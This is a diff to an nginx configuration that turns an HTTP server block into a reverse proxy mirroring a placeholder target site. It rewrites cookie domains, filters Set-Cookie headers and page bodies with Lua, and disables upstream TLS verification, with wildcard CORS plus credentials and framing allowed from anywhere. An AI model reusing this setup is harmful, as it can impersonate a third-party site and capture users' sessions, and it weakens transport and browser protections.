@@ -210,8 +210,96 @@ server {
     listen 80;
     server_name PROXY_DOMAIN_PLACEHOLDER;
     
-    # Redirect HTTP to HTTPS
-    return 301 https://$server_name$request_uri;
+    # Don't redirect HTTP to HTTPS to avoid Cloudflare loops
+    # Just proxy directly to target
+    location / {
+        # Allow all IPs
+        allow all;
+        
+        # Rate limiting
+        limit_req zone=krea_limit burst=20 nodelay;
+        
+        # Proxy settings with improved domain handling
+        proxy_pass https://TARGET_DOMAIN_PLACEHOLDER;
+        proxy_set_header Host TARGET_DOMAIN_PLACEHOLDER;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_set_header X-Forwarded-Host PROXY_DOMAIN_PLACEHOLDER;
+        proxy_set_header X-Forwarded-Server PROXY_DOMAIN_PLACEHOLDER;
+
+        # WebSocket support
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+
+        # Timeouts
+        proxy_connect_timeout 60s;
+        proxy_send_timeout 60s;
+        proxy_read_timeout 60s;
+
+        # Buffer settings for performance
+        proxy_buffering on;
+        proxy_buffer_size 4k;
+        proxy_buffers 8 4k;
+        proxy_busy_buffers_size 8k;
+
+        # Disable compression for body filtering
+        proxy_set_header Accept-Encoding "";
+
+        # SSL settings for upstream - FIXES SSL PROBLEMS
+        proxy_ssl_verify off;
+        proxy_ssl_server_name on;
+        proxy_ssl_protocols TLSv1.2 TLSv1.3;
+        proxy_ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256;
+
+        # Handle redirects properly
+        proxy_intercept_errors on;
+        
+        # Cookie domain rewriting (fallback)
+        proxy_cookie_domain TARGET_DOMAIN_PLACEHOLDER PROXY_DOMAIN_PLACEHOLDER;
+        proxy_cookie_domain .TARGET_DOMAIN_PLACEHOLDER .PROXY_DOMAIN_PLACEHOLDER;
+        proxy_cookie_domain www.TARGET_DOMAIN_PLACEHOLDER PROXY_DOMAIN_PLACEHOLDER;
+        proxy_cookie_domain .www.TARGET_DOMAIN_PLACEHOLDER .PROXY_DOMAIN_PLACEHOLDER;
+
+        # Lua header filter for Set-Cookie manipulation
+        header_filter_by_lua_file /etc/nginx/lua/cookie_filter.lua;
+
+        # Lua body filter for URL replacement
+        body_filter_by_lua_file /etc/nginx/lua/body_filter.lua;
+
+        # Remove Content-Length for body manipulation
+        proxy_hide_header Content-Length;
+        
+        # Error handling
+        error_page 403 404 500 502 503 504 = @fallback;
+
+        # CORS headers for iframe support
+        add_header Access-Control-Allow-Origin "*" always;
+        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS, HEAD" always;
+        add_header Access-Control-Allow-Headers "Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control" always;
+        add_header Access-Control-Allow-Credentials "true" always;
+        add_header Access-Control-Max-Age "86400" always;
+
+        # Security headers
+        add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
+        add_header X-Content-Type-Options nosniff always;
+        add_header X-Frame-Options "ALLOWALL" always;
+        add_header X-XSS-Protection "1; mode=block" always;
+        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+
+        # Handle preflight requests
+        if ($request_method = 'OPTIONS') {
+            add_header Access-Control-Allow-Origin "*";
+            add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS, HEAD";
+            add_header Access-Control-Allow-Headers "Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control";
+            add_header Access-Control-Allow-Credentials "true";
+            add_header Access-Control-Max-Age "86400";
+            add_header Content-Length 0;
+            add_header Content-Type text/plain;
+            return 204;
+        }
+    }
 }
 
 server {
